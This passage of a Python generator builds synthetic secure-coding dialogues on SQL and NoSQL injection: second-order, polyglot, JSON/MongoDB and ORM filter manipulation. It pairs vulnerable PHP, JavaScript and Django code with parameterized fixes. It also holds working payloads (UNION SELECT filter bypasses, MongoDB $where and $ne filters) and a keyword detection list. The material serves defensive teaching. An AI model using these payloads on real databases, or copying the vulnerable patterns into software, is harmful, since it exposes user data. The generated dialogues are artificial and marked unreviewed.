        String sql = "SELECT COUNT(*) FROM user_actions WHERE username = ?";
        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, usernameFromDb);
            ResultSet rs = pstmt.executeQuery();
            // Process results...
        }
    }
}
```"""

    human_turn_3 = """What about logging or audit trails that might execute second-order injection?"""

    assistant_turn_3 = """Audit logs are **high-risk** for second-order injection. Use parameterized queries there too:

```java
import java.sql.*;
import java.time.Instant;

public class AuditLogger {

    // VULNERABLE: Logging user activity
    public void logActionVulnerable(String username, String action) throws SQLException {
        Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);

        // DANGER: Building SQL from user data
        String sql = "INSERT INTO audit_log (username, action, timestamp) " +
                    "VALUES ('" + username + "', '" + action + "', NOW())";

        Statement stmt = conn.createStatement();
        stmt.executeUpdate(sql);
    }

    // SECURE: Parameterized logging
    public void logActionSecure(String username, String action) throws SQLException {
        Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);

        // Parameterized insert - safe even with malicious data
        String sql = "INSERT INTO audit_log (username, action, timestamp) VALUES (?, ?, ?)";

        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, username);
            pstmt.setString(2, action);
            pstmt.setTimestamp(3, Timestamp.from(Instant.now()));
            pstmt.executeUpdate();
        }
    }

    // SECURE: Querying audit logs
    public void searchAuditLogs(String searchUsername) throws SQLException {
        Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);

        // Even when searching logs, use prepared statement
        String sql = "SELECT action, timestamp FROM audit_log WHERE username = ? ORDER BY timestamp DESC";

        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, searchUsername);
            ResultSet rs = pstmt.executeQuery();

            while (rs.next()) {
                System.out.println(rs.getTimestamp("timestamp") + ": " + rs.getString("action"));
            }
        }
    }
}
```

**Common Second-Order Vectors**:
1. **User profiles** → displayed on admin panels
2. **Comments/posts** → searched/filtered by admins
3. **Audit logs** → queried for security investigations
4. **Error messages** → logged then displayed
5. **Saved searches** → re-executed later"""

    human_turn_4 = """What's the production pattern with Hibernate/JPA to prevent this?"""

    assistant_turn_4 = """Use **JPA/Hibernate** which parameterizes automatically:

```java
import javax.persistence.*;
import java.time.Instant;
import java.util.List;

// Entity for User
@Entity
@Table(name = "users")
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, unique = true, length = 20)
    private String username;

    @Column(nullable = false, length = 100)
    private String email;

    // Getters/setters
}

// Entity for Audit Log
@Entity
@Table(name = "audit_log")
public class AuditLog {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, length = 20)
    private String username;

    @Column(nullable = false, length = 500)
    private String action;

    @Column(nullable = false)
    private Instant timestamp;

    // Getters/setters
}

// Service layer - completely safe from second-order injection
@Service
public class UserService {

    @PersistenceContext
    private EntityManager entityManager;

    // Registration - JPA automatically parameterizes
    @Transactional
    public void registerUser(String username, String email) {
        // Input validation
        if (!username.matches("^[a-zA-Z0-9_]{3,20}$")) {
            throw new IllegalArgumentException("Invalid username");
        }

        User user = new User();
        user.setUsername(username);
        user.setEmail(email);

        entityManager.persist(user); // Safe storage
    }

    // View stats - JPA query with named parameter (safe from second-order)
    @Transactional(readOnly = true)
    public long getUserActionCount(String username) {
        // Even data from database is parameterized
        String jpql = "SELECT COUNT(a) FROM AuditLog a WHERE a.username = :username";

        TypedQuery<Long> query = entityManager.createQuery(jpql, Long.class);
        query.setParameter("username", username); // Parameterized

        return query.getSingleResult();
    }

    // Audit logging - automatically parameterized
    @Transactional
    public void logAction(String username, String action) {
        AuditLog log = new AuditLog();
        log.setUsername(username);
        log.setAction(action);
        log.setTimestamp(Instant.now());

        entityManager.persist(log); // Safe even with malicious data
    }

    // Search audit logs - Criteria API for dynamic queries
    @Transactional(readOnly = true)
    public List<AuditLog> searchAuditLogs(String username, String actionPattern) {
        CriteriaBuilder cb = entityManager.getCriteriaBuilder();
        CriteriaQuery<AuditLog> cq = cb.createQuery(AuditLog.class);
        Root<AuditLog> root = cq.from(AuditLog.class);

        // Build dynamic query safely with Criteria API
        Predicate predicate = cb.and(
            cb.equal(root.get("username"), username), // Parameterized
            cb.like(root.get("action"), actionPattern) // Parameterized
        );

        cq.where(predicate);
        cq.orderBy(cb.desc(root.get("timestamp")));

        return entityManager.createQuery(cq)
                           .setMaxResults(100)
                           .getResultList();
    }
}
```

**Repository Pattern** (Spring Data JPA):

```java
import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;

public interface AuditLogRepository extends JpaRepository<AuditLog, Long> {

    // Automatic parameterization by Spring Data
    List<AuditLog> findByUsername(String username);

    // Custom query with named parameter
    @Query("SELECT a FROM AuditLog a WHERE a.username = :username AND a.action LIKE :pattern")
    List<AuditLog> searchLogs(@Param("username") String username, @Param("pattern") String pattern);

    // Count with parameterization
    long countByUsername(String username);
}
```

**Production Security**:
1. **JPA/Hibernate**: Automatic parameterization everywhere
2. **Criteria API**: Safe dynamic queries
3. **Named parameters**: Explicit parameter binding
4. **No native SQL**: Avoid raw SQL unless absolutely necessary
5. **Input validation**: Defense in depth at entity level"""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }

def example_008_polyglot():
    """PHP - Polyglot SQL injection payloads."""

    example_id = "sql-injection-000028"
    metadata = create_base_metadata("php", 8, "polyglot_payloads")

    context = {
        "real_world_incident": "2021 Accellion FTA zero-day SQL injection",
        "impact": "100+ organizations breached including Kroger, QIMR",
        "attack_vector": "Polyglot payload bypassing input filters",
        "business_impact": "$10M+ in breach costs across victims"
    }

    human_turn_1 = """What are polyglot SQL injection payloads and why are they effective?"""

    assistant_turn_1 = """Polyglot payloads work across multiple database systems and bypass many filters:

**VULNERABLE CODE**:

```php
<?php
function search_products($search) {
    $conn = mysqli_connect("localhost", "user", "pass", "shop");

    // Basic filtering attempt
    $search = str_replace(["'", "\""], "", $search);  // Remove quotes
    $search = str_replace(["UNION", "SELECT"], "", $search); // Remove keywords

    // Still vulnerable!
    $sql = "SELECT * FROM products WHERE name LIKE '%$search%'";
    $result = mysqli_query($conn, $sql);

    return mysqli_fetch_all($result, MYSQLI_ASSOC);
}

$results = search_products($_GET['q']);
?>
```

**Polyglot Attack Payloads**:

**1. Case Variation Bypass**:
```sql
%' uNiOn SeLeCt null,@@version,null-- -

-- Bypasses: str_replace(["UNION", "SELECT"], "", $search)
```

**2. Comment-Based Obfuscation** (works on MySQL, PostgreSQL, MSSQL):
```sql
%'/**/UNION/**/SELECT/**/NULL,version(),NULL--+-

-- Works on all three databases
-- Bypasses keyword filtering
```

**3. Double-Encoding**:
```sql
%2527%2520UNION%2520SELECT%2520NULL-- -

-- URL decoded once by web server: %27%20UNION%20SELECT%20NULL--
-- Decoded again in application: ' UNION SELECT NULL--
```

**4. Concatenation Bypass**:
```sql
%' UN' + 'ION SE' + 'LECT NULL--

-- SQL Server concatenates to: UNION SELECT
```

**5. Cross-Database Polyglot**:
```sql
%' AND 1=0 UNION ALL SELECT NULL,COALESCE(version(),@@version,version),NULL-- -

-- COALESCE() works on MySQL, PostgreSQL, MSSQL
-- First non-NULL value returned
```

**Why Polyglots Work**:
1. **Cross-database compatibility**: Single payload works on multiple DBs
2. **Filter evasion**: Bypasses keyword blocklists
3. **Encoding tricks**: Defeats simple sanitization
4. **Comment abuse**: Splits keywords across comments"""

    human_turn_2 = """How do I defend against polyglot SQL injection payloads?"""

    assistant_turn_2 = """Use **parameterized queries** - they're immune to all polyglot tricks:

**SECURE VERSION**:

```php
<?php
function search_products($search) {
    $conn = mysqli_connect("localhost", "user", "pass", "shop");

    // Input validation (defense in depth)
    if (strlen($search) > 100) {
        http_response_code(400);
        die(json_encode(['error' => 'Search query too long']));
    }

    // Prepared statement - immune to all polyglot attacks
    $stmt = $conn->prepare("SELECT id, name, price FROM products WHERE name LIKE CONCAT('%', ?, '%')");
    $stmt->bind_param("s", $search);
    $stmt->execute();

    $result = $stmt->get_result();
    return $result->fetch_all(MYSQLI_ASSOC);
}

// Validate input
$search = $_GET['q'] ?? '';

// Rate limiting
session_start();
$_SESSION['search_count'] = ($_SESSION['search_count'] ?? 0) + 1;

if ($_SESSION['search_count'] > 100) {
    http_response_code(429);
    die(json_encode(['error' => 'Rate limit exceeded']));
}

$results = search_products($search);
echo json_encode(['products' => $results]);
?>
```

**Why This Is Secure**:
1. **Prepared statement**: Query structure fixed, can't be altered
2. **Parameter binding**: `$search` treated as literal string
3. **No string concatenation**: Polyglots have nothing to manipulate
4. **Rate limiting**: Prevents brute force attacks

**Defense in Depth** (if you MUST validate input):

```php
<?php
class SQLInjectionDefense {

    // Dangerous patterns across all databases
    private static $patterns = [
        '/\b(union|select|insert|update|delete|drop|create|alter|exec|execute)\b/i',
        '/(\||&&|;|--|\/\*|\*\/|xp_|sp_)/i',
        '/(char|concat|group_concat|load_file|into\s+outfile)/i',
        '/(\bor\b|\band\b)\s*[\'\"]?\s*[\w\d]/i',
    ];

    public static function validate($input, $field = "input") {
        // Length check
        if (strlen($input) > 1000) {
            throw new Exception("$field too long");
        }

        // Pattern check (but NOT primary defense!)
        foreach (self::$patterns as $pattern) {
            if (preg_match($pattern, $input)) {
                error_log("Suspicious pattern in $field: $input");
                // Log but don't block - parameterized queries are real protection
            }
        }

        return true;
    }
}

function search_products_defensive($search) {
    // Defense layer 1: Validation
    SQLInjectionDefense::validate($search, "search query");

    $conn = mysqli_connect("localhost", "user", "pass", "shop");

    // Defense layer 2: Prepared statement (PRIMARY DEFENSE)
    $stmt = $conn->prepare("SELECT id, name, price FROM products WHERE name LIKE CONCAT('%', ?, '%')");
    $stmt->bind_param("s", $search);
    $stmt->execute();

    return $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
}
?>
```

**Key Point**: Input validation is **defense in depth**, not primary protection. Parameterized queries are the real defense."""

    human_turn_3 = """What if I need to build dynamic queries that can't use simple parameters?"""

    assistant_turn_3 = """Use **allowlisting** with **query builder pattern**:

```php
<?php
class SafeQueryBuilder {

    // Allowlist of safe table columns
    private const ALLOWED_COLUMNS = [
        'id', 'name', 'price', 'category', 'created_at'
    ];

    private const ALLOWED_SORT_ORDERS = ['ASC', 'DESC'];

    private $conn;
    private $where_conditions = [];
    private $params = [];
    private $types = '';

    public function __construct($conn) {
        $this->conn = $conn;
    }

    public function whereLike($column, $value) {
        // Validate column is in allowlist
        if (!in_array($column, self::ALLOWED_COLUMNS)) {
            throw new Exception("Invalid column: $column");
        }

        $this->where_conditions[] = "$column LIKE CONCAT('%', ?, '%')";
        $this->params[] = $value;
        $this->types .= 's';

        return $this;
    }

    public function whereEquals($column, $value) {
        if (!in_array($column, self::ALLOWED_COLUMNS)) {
            throw new Exception("Invalid column: $column");
        }

        $this->where_conditions[] = "$column = ?";
        $this->params[] = $value;
        $this->types .= 's';

        return $this;
    }

    public function execute($sort_by = 'name', $order = 'ASC') {
        // Validate sort parameters against allowlist
        if (!in_array($sort_by, self::ALLOWED_COLUMNS)) {
            throw new Exception("Invalid sort column");
        }

        $order = strtoupper($order);
        if (!in_array($order, self::ALLOWED_SORT_ORDERS)) {
            throw new Exception("Invalid sort order");
        }

        // Build query safely
        $where_clause = !empty($this->where_conditions)
            ? "WHERE " . implode(" AND ", $this->where_conditions)
            : "";

        // Sort column and order from allowlist (safe to concatenate)
        $sql = "SELECT id, name, price FROM products $where_clause ORDER BY $sort_by $order";

        $stmt = $this->conn->prepare($sql);

        if (!empty($this->params)) {
            $stmt->bind_param($this->types, ...$this->params);
        }

        $stmt->execute();
        return $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
    }
}

// Usage
$conn = mysqli_connect("localhost", "user", "pass", "shop");

$builder = new SafeQueryBuilder($conn);

$results = $builder
    ->whereLike('name', $_GET['search'])
    ->whereEquals('category', $_GET['category'])
    ->execute($_GET['sort'] ?? 'name', $_GET['order'] ?? 'ASC');

echo json_encode(['products' => $results]);
?>
```

**Why This Is Safe**:
- User input only goes into parameterized values
- Column names and sort order from allowlist
- No user-controlled SQL syntax
- Dynamic query building without string concatenation"""

    human_turn_4 = """What's the production pattern with Laravel/Eloquent?"""

    assistant_turn_4 = """Use **Laravel Eloquent** with **query scopes**:

```php
<?php
namespace App\\Models;

use Illuminate\\Database\\Eloquent\\Model;

class Product extends Model
{
    protected $fillable = ['name', 'price', 'category'];

    // Allowlist of sortable columns
    public const SORTABLE_COLUMNS = ['name', 'price', 'created_at'];

    // Query scope for safe search
    public function scopeSearch($query, $search)
    {
        // Eloquent automatically parameterizes
        return $query->where('name', 'LIKE', '%' . $search . '%');
    }

    // Query scope for category filter
    public function scopeCategory($query, $category)
    {
        return $query->where('category', $category);
    }

    // Query scope for safe sorting
    public function scopeSortBy($query, $column, $direction = 'asc')
    {
        // Validate against allowlist
        if (!in_array($column, self::SORTABLE_COLUMNS)) {
            $column = 'name'; // Default to safe column
        }

        $direction = strtolower($direction) === 'desc' ? 'desc' : 'asc';

        return $query->orderBy($column, $direction);
    }
}
```

**Controller**:

```php
<?php
namespace App\\Http\\Controllers;

use App\\Models\\Product;
use Illuminate\\Http\\Request;
use Illuminate\\Support\\Facades\\Validator;

class ProductController extends Controller
{
    public function search(Request $request)
    {
        // Input validation
        $validator = Validator::make($request->all(), [
            'q' => 'required|string|min:2|max:100',
            'category' => 'nullable|string|max:50',
            'sort' => 'nullable|string|in:name,price,created_at',
            'order' => 'nullable|string|in:asc,desc'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'error' => 'Invalid input',
                'details' => $validator->errors()
            ], 400);
        }

        // Build query using Eloquent (automatically parameterized)
        $query = Product::query();

        // Apply search if provided
        if ($request->filled('q')) {
            $query->search($request->input('q'));
        }

        // Apply category filter if provided
        if ($request->filled('category')) {
            $query->category($request->input('category'));
        }

        // Apply sorting
        $query->sortBy(
            $request->input('sort', 'name'),
            $request->input('order', 'asc')
        );

        // Paginate results
        $products = $query->paginate(20);

        return response()->json([
            'products' => $products->items(),
            'total' => $products->total(),
            'per_page' => $products->perPage(),
            'current_page' => $products->currentPage()
        ]);
    }
}
```

**Advanced Query Builder**:

```php
<?php
namespace App\\Services;

use App\\Models\\Product;
use Illuminate\\Database\\Eloquent\\Builder;

class ProductSearchService
{
    public function search(array $filters): Builder
    {
        $query = Product::query();

        // All filters use Eloquent's automatic parameterization
        if (isset($filters['name'])) {
            $query->where('name', 'LIKE', '%' . $filters['name'] . '%');
        }

        if (isset($filters['min_price'])) {
            $query->where('price', '>=', $filters['min_price']);
        }

        if (isset($filters['max_price'])) {
            $query->where('price', '<=', $filters['max_price']);
        }

        if (isset($filters['categories'])) {
            // whereIn automatically parameterized
            $query->whereIn('category', $filters['categories']);
        }

        return $query;
    }
}
```

**Production Security**:
1. **Eloquent ORM**: Automatic parameterization everywhere
2. **Query scopes**: Encapsulate safe query logic
3. **Input validation**: Laravel validator with rules
4. **Allowlisting**: Sortable columns defined in model
5. **Pagination**: Prevents resource exhaustion
6. **No raw SQL**: Unless absolutely necessary with bindings"""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }

def example_009_json_injection():
    """JavaScript - SQL injection in JSON/NoSQL query contexts."""

    example_id = "sql-injection-000029"
    metadata = create_base_metadata("javascript", 9, "json_context_injection")

    context = {
        "real_world_incident": "2020 MongoDB injection in Clubhouse app",
        "impact": "1.3M user records exposed via NoSQL injection",
        "attack_vector": "JSON query injection in MongoDB filters",
        "business_impact": "Privacy breach leading to data scraping concerns"
    }

    human_turn_1 = """Can JSON-based queries be vulnerable to SQL/NoSQL injection?"""

    assistant_turn_1 = """Yes! JSON query injection is common in MongoDB and REST APIs:

**VULNERABLE CODE**:

```javascript
const express = require('express');
const { MongoClient } = require('mongodb');

app.get('/api/users', async (req, res) => {
    const filter = JSON.parse(req.query.filter || '{}');

    // DANGER: User-controlled filter object
    const users = await db.collection('users').find(filter).toArray();

    res.json(users);
});
```

**Attack Payload**:
```javascript
// URL: /api/users?filter={"$where":"this.password.match(/^admin/)"}
// Exfiltrates admin passwords via regex timing

// Or: /api/users?filter={"role":{"$ne":"user"}}
// Returns all non-user accounts (admins, etc.)
```

**Why Dangerous**: User controls query structure, not just values."""

    human_turn_2 = """How do I secure JSON-based queries in MongoDB/NoSQL?"""

    assistant_turn_2 = """Use **allowlisting** and **sanitization**:

**SECURE VERSION**:

```javascript
const express = require('express');
const { MongoClient } = require('mongodb');

// Allowlist of safe filter fields
const ALLOWED_FIELDS = ['username', 'email', 'createdAt'];

function sanitizeFilter(userFilter) {
    const safe = {};

    for (const [key, value] of Object.entries(userFilter)) {
        // Only allow allowlisted fields
        if (!ALLOWED_FIELDS.includes(key)) continue;

        // Block MongoDB operators
        if (key.startsWith('$')) {
            throw new Error('Operator not allowed');
        }

        // Only allow string/number values
        if (typeof value === 'object') {
            throw new Error('Complex queries not allowed');
        }

        safe[key] = value;
    }

    return safe;
}

app.get('/api/users', async (req, res) => {
    try {
        const userFilter = JSON.parse(req.query.filter || '{}');
        const safeFilter = sanitizeFilter(userFilter);

        const users = await db.collection('users')
            .find(safeFilter)
            .project({ password: 0 }) // Never return passwords
            .limit(100)
            .toArray();

        res.json(users);
    } catch (error) {
        res.status(400).json({ error: 'Invalid filter' });
    }
});
```"""

    human_turn_3 = """What about SQL databases with JSON columns? Can those be injected?"""

    assistant_turn_3 = """Yes! PostgreSQL/MySQL JSON functions need parameterization:

```javascript
const { Client } = require('pg');

// VULNERABLE
app.get('/api/search', async (req, res) => {
    const jsonPath = req.query.path;

    // DANGER: User-controlled JSON path
    const query = `SELECT * FROM products WHERE data->'${jsonPath}' = 'value'`;
    const result = await client.query(query);

    res.json(result.rows);
});

// SECURE
app.get('/api/search', async (req, res) => {
    const ALLOWED_PATHS = ['name', 'category', 'tags'];
    const jsonPath = req.query.path;

    if (!ALLOWED_PATHS.includes(jsonPath)) {
        return res.status(400).json({ error: 'Invalid path' });
    }

    // Parameterized query with allowlisted path
    const query = `SELECT id, name FROM products WHERE data->$1 = $2`;
    const result = await client.query(query, [jsonPath, req.query.value]);

    res.json(result.rows);
});
```"""

    human_turn_4 = """What's the production pattern with Mongoose (MongoDB ORM)?"""

    assistant_turn_4 = """Use **Mongoose** with **schema validation**:

```javascript
const mongoose = require('mongoose');
const express = require('express');

// Define schema with validation
const userSchema = new mongoose.Schema({
    username: { type: String, required: true, index: true },
    email: { type: String, required: true },
    role: { type: String, enum: ['user', 'admin'], default: 'user' },
    createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);

app.get('/api/users', async (req, res) => {
    try {
        const { username, email } = req.query;

        // Build filter using Mongoose methods (safe)
        const filter = {};

        if (username) {
            filter.username = new RegExp(username, 'i'); // Case-insensitive search
        }

        if (email) {
            filter.email = email;
        }

        const users = await User
            .find(filter)
            .select('-password') // Exclude password
            .limit(100)
            .lean(); // Return plain objects

        res.json({ users });
    } catch (error) {
        res.status(500).json({ error: 'Server error' });
    }
});
```

**Production Security**: Mongoose schema enforces types, preventing operator injection."""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_010_orm_bypass():
    """Python - Advanced ORM query manipulation techniques."""

    example_id = "sql-injection-000030"
    metadata = create_base_metadata("python", 10, "orm_query_manipulation")

    context = {
        "real_world_incident": "2022 Django ORM bypass in multiple applications",
        "impact": "Mass assignment vulnerabilities leading to privilege escalation",
        "attack_vector": "ORM filter manipulation via query parameters",
        "business_impact": "Unauthorized admin access across platforms"
    }

    human_turn_1 = """Can ORMs like Django/SQLAlchemy be exploited for SQL injection?"""

    assistant_turn_1 = """ORMs prevent traditional SQLi, but can be bypassed via query manipulation:

**VULNERABLE CODE** (Django):

```python
from django.shortcuts import render
from .models import Product

def search_products(request):
    # DANGER: User-controlled filter kwargs
    filter_params = request.GET.dict()

    # Attacker can inject any field filter
    products = Product.objects.filter(**filter_params)

    return render(request, 'products.html', {'products': products})
```

**Attack**:
```
GET /search?user__is_staff=True&user__is_active=True

# Traverses to User model via foreign key
# Returns products belonging to staff users
# Bypasses intended access control
```"""

    human_turn_2 = """How do I prevent ORM query manipulation attacks?"""

    assistant_turn_2 = """Use **explicit field allowlisting**:

**SECURE VERSION**:

```python
from django.shortcuts import render
from .models import Product

ALLOWED_FILTERS = {
    'name': 'name__icontains',
    'category': 'category__exact',
    'min_price': 'price__gte',
    'max_price': 'price__lte',
}

def search_products(request):
    filter_kwargs = {}

    for param, django_lookup in ALLOWED_FILTERS.items():
        value = request.GET.get(param)
        if value:
            filter_kwargs[django_lookup] = value

    products = Product.objects.filter(**filter_kwargs)[:100]

    return render(request, 'products.html', {'products': products})
```"""

    human_turn_3 = """What about mass assignment vulnerabilities in ORMs?"""

    assistant_turn_3 = """Protect model fields from mass assignment:

```python
from django.db import models

class User(models.Model):
    username = models.CharField(max_length=50)
    email = models.EmailField()
    is_staff = models.BooleanField(default=False)
    is_admin = models.BooleanField(default=False)

    # Fields that can NEVER be mass-assigned
    PROTECTED_FIELDS = ['is_staff', 'is_admin', 'id']

def create_user(request):
    data = request.POST.dict()

    # Remove protected fields
    for field in User.PROTECTED_FIELDS:
        data.pop(field, None)

    # Only allow allowlisted fields
    ALLOWED_FIELDS = ['username', 'email', 'password']
    safe_data = {k: v for k, v in data.items() if k in ALLOWED_FIELDS}

    user = User.objects.create(**safe_data)
    return user
```"""

    human_turn_4 = """What's the production pattern with Django Rest Framework?"""

    assistant_turn_4 = """Use **DRF serializers** with explicit field control:

```python
from rest_framework import serializers, viewsets
from .models import Product

class ProductSerializer(serializers.ModelSerializer):
    class Meta:
        model = Product
        fields = ['id', 'name', 'price', 'category']  # Explicit allowlist
        read_only_fields = ['id']  # Prevent modification

class ProductViewSet(viewsets.ReadOnlyModelViewSet):
    queryset = Product.objects.all()
    serializer_class = ProductSerializer

    def get_queryset(self):
        queryset = super().get_queryset()

        # Safe filtering with explicit field names
        name = self.request.query_params.get('name')
        if name:
            queryset = queryset.filter(name__icontains=name)

        category = self.request.query_params.get('category')
        if category:
            queryset = queryset.filter(category=category)

        return queryset[:100]  # Limit results
```

**Production Security**: DRF serializers prevent mass assignment, explicit filtering prevents traversal."""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def main():
    """Generate Batch 010: SQL Injection Advanced."""
    print("Generating Batch 010: SQL Injection Advanced")
    print("=" * 60)

    # Generate all 10 examples
    examples = [
        example_001_union_based(),
        example_002_error_based(),
        example_003_time_based_blind(),
        example_004_boolean_based_blind(),
        example_005_waf_bypass(),
        example_006_oob_injection(),
        example_007_second_order(),
        example_008_polyglot(),
        example_009_json_injection(),
        example_010_orm_bypass(),
    ]

    # Write to output file
    output_dir = Path(__file__).parent.parent / 'data'
    output_file = output_dir / 'sql_advanced_batch_010.jsonl'

    with open(output_file, 'w', encoding='utf-8') as f:
        for example in examples:
            f.write(json.dumps(example, ensure_ascii=False) + '\n')

    print(f"\nGenerated {len(examples)} examples")
    print(f"Output: {output_file}")

    print("\nExamples:")
    for ex in examples:
        print(f"  {ex['id']}: {ex['metadata']['lang']} - {ex['metadata']['technique']}")

    return 0


if __name__ == "__main__":
    exit(main())
